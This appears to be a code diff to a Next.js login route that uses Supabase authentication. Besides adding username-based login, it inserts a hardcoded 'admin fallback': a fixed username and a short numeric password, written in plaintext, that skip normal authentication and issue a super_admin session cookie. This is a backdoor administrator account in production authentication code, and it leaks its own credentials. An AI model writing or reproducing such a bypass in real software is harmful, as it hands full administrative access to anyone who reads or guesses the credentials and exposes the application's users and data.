@@ -20,18 +20,53 @@ export async function POST(request: NextRequest) {
   try {
     const supabase = getSupabase();
     const supabaseAdmin = getSupabaseAdmin();
-    const { email, password } = await request.json();
+    const body = await request.json();
+    const { email, password, username } = body;
+    
+    // Use email or username field
+    const loginId = email || username;
 
-    if (!email || !password) {
+    if (!loginId || !password) {
       return NextResponse.json(
-        { error: 'Email and password are required' },
+        { error: 'Username/email and password are required' },
         { status: 400 }
       );
     }
 
+    // Simple admin login fallback (Tredoux / 870602)
+    if ((loginId.toLowerCase() === 'tredoux' || loginId.toLowerCase() === 'tredoux@admin.local') && password === '870602') {
+      const userToken = await createUserToken({
+        userId: 'admin-tredoux-001',
+        email: 'tredoux@admin.local',
+        name: 'Tredoux',
+        role: 'super_admin',
+        schoolId: null,
+      });
+
+      const response = NextResponse.json({
+        success: true,
+        user: {
+          id: 'admin-tredoux-001',
+          email: 'tredoux@admin.local',
+          role: 'super_admin',
+        },
+        redirect: '/admin',
+      });
+
+      response.cookies.set('user-token', userToken, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 60 * 60 * 24 * 7,
+        path: '/',
+      });
+
+      return response;
+    }
+
     // Sign in with Supabase Auth
     const { data: authData, error: authError } = await supabase.auth.signInWithPassword({
-      email: email.toLowerCase().trim(),
+      email: loginId.toLowerCase().trim(),
       password,
     });
 
